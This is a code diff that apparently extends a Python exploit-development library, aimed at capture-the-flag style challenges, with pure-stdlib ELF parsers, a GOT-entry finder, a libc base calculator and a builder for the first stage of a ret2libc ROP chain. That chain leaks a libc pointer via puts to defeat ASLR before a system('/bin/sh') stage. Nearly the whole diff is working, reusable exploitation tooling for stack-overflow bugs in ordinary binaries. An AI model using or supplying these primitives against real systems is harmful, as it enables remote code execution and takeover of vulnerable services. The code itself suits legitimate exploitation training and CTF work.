@@ -134,6 +134,137 @@ def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length:
     return bytes(body)
 
 
+# --- ret2libc WITH a runtime leak (defeats ASLR without a `system` PLT entry) -------------------
+# A modern challenge imports only puts/printf/read from libc -- never `system` -- and runs under
+# ASLR, so neither a `system` PLT slot nor a fixed libc address exists. The classic answer is two
+# stages over one connection: leak a libc pointer (call puts@plt on a GOT entry), subtract the
+# symbol's known offset in THIS libc to recover the base, then re-trigger the overflow with a
+# system("/bin/sh") chain built from base+offset. These helpers are the reusable primitives.
+
+def _elf_class_endian(data: bytes):
+    return (data[4] == 2, "<" if data[5] == 1 else ">")   # (is64, struct endian char)
+
+
+def _sections(data: bytes) -> dict:
+    """{section name: (offset, size, entsize)} from the section header table; {} on malformation."""
+    try:
+        is64, endc = _elf_class_endian(data)
+        if is64:
+            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
+            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x3A)
+            fmt, off_i, sz_i, ent_i = endc + "IIQQQQIIQQ", 4, 5, 9
+        else:
+            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
+            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x2E)
+            fmt, off_i, sz_i, ent_i = endc + "IIIIIIIIII", 4, 5, 9
+        shs = [struct.unpack_from(fmt, data, e_shoff + i * e_shentsize) for i in range(e_shnum)]
+        strtab_off = shs[e_shstrndx][off_i]
+
+        def _name(o):
+            end = data.find(b"\x00", strtab_off + o)
+            return data[strtab_off + o:end].decode("latin-1", "replace")
+
+        return {_name(sh[0]): (sh[off_i], sh[sz_i], sh[ent_i]) for sh in shs}
+    except Exception:
+        return {}
+
+
+def libc_symbols(data: bytes, names) -> dict:
+    """{name: st_value} for the requested EXPORTED symbols of a libc/.so, read straight from
+    .dynsym. `st_value` is the unrelocated vaddr, so the runtime address is `libc_base + st_value`.
+    Pure stdlib (no readelf/nm), best-effort: {} on any malformation."""
+    secs = _sections(data)
+    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
+    if not ds or not st:
+        return {}
+    is64, endc = _elf_class_endian(data)
+    entsize = ds[2] or (24 if is64 else 16)
+    stroff = st[0]
+    want, out = set(names), {}
+    for o in range(ds[0], ds[0] + ds[1], entsize):
+        try:
+            if is64:
+                st_name, _info, _oth, st_shndx, st_value, _sz = struct.unpack_from(
+                    endc + "IBBHQQ", data, o)
+            else:
+                st_name, st_value, _sz, _info, _oth, st_shndx = struct.unpack_from(
+                    endc + "IIIBBH", data, o)
+        except struct.error:
+            break
+        if st_shndx == 0 or not st_value:            # undefined import, or no address -> skip
+            continue
+        end = data.find(b"\x00", stroff + st_name)
+        nm = data[stroff + st_name:end].decode("latin-1", "replace")
+        if nm in want and nm not in out:
+            out[nm] = st_value
+            if len(out) == len(want):
+                break
+    return out
+
+
+def got_entry(data: bytes, name: str):
+    """The GOT slot the PLT stub for `name` dereferences, read from .rela.plt/.rel.plt. For a
+    no-PIE binary this is the absolute address whose contents (the resolved libc function) a
+    `puts(got)` leak prints -- so leaking it and subtracting the symbol's libc offset gives the
+    libc base. Pure stdlib, best-effort: None if the reloc/symbol tables are absent."""
+    secs = _sections(data)
+    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
+    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
+    if not rela or not ds or not st:
+        return None
+    is64, endc = _elf_class_endian(data)
+    rel_ent = rela[2] or (24 if is64 else 8)
+    sym_ent = ds[2] or (24 if is64 else 16)
+    stroff = st[0]
+
+    def _symname(idx):
+        try:
+            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
+            end = data.find(b"\x00", stroff + st_name)
+            return data[stroff + st_name:end].decode("latin-1", "replace")
+        except struct.error:
+            return ""
+
+    for o in range(rela[0], rela[0] + rela[1], rel_ent):
+        try:
+            if is64:
+                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
+                sym = r_info >> 32
+            else:
+                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
+                sym = r_info >> 8
+        except struct.error:
+            break
+        if _symname(sym) == name:
+            return r_offset
+    return None
+
+
+def resolve_libc_base(leaked: int, sym_offset: int):
+    """libc load base from a leaked runtime address of a symbol at `sym_offset`. A real libc base
+    is page-aligned; anything else means the leak was not the pointer we assumed, so return None
+    rather than a bogus base that would send every resolved address into the weeds."""
+    base = leaked - sym_offset
+    return base if base > 0 and base % 0x1000 == 0 else None
+
+
+def build_leak_puts(offset: int, *, pop_rdi: int, got: int, puts_plt: int, ret_to: int,
+                    length: int = 0, ret_gadget=None) -> bytes:
+    """Stage 1: cyclic filler, then puts(GOT) -- prints the libc address stored at `got` as raw
+    little-endian bytes -- and returns to `ret_to` (the vulnerable function / main) so the program
+    loops back and reads stage 2 over the same connection."""
+    body = bytearray(_cyclic(offset))
+    chain = [pop_rdi, got, puts_plt]
+    if ret_gadget:
+        chain.append(ret_gadget)                         # keep rsp 16-aligned for the re-entry
+    chain.append(ret_to)
+    for word in chain:
+        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
+    if len(body) < length:
+        body += b"C" * (length - len(body))
+    return bytes(body)
+
+
 def _cyclic(n):
     from .primitive import cyclic
     return cyclic(n)
